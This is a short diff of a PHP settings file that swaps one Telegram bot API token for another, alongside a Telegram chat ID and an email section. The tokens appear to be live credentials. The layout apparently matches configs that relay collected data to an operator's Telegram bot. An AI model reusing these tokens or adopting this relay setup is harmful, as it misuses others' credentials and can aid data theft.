@@ -1,7 +1,7 @@
 <?php
 
 //-----------TelegramID Settings
-$botAPI  = "1108736073:AAEaWCVGKEU8LYNmsJBVPVyUDkqCyqVsiRM";
+$botAPI  = "1108736073:AAFx2qtQ_XPhl6AgA7fq8yv7QQ67s7MKuqc";
 $telegramid  = "979035419";
 
 //-----------Your Email
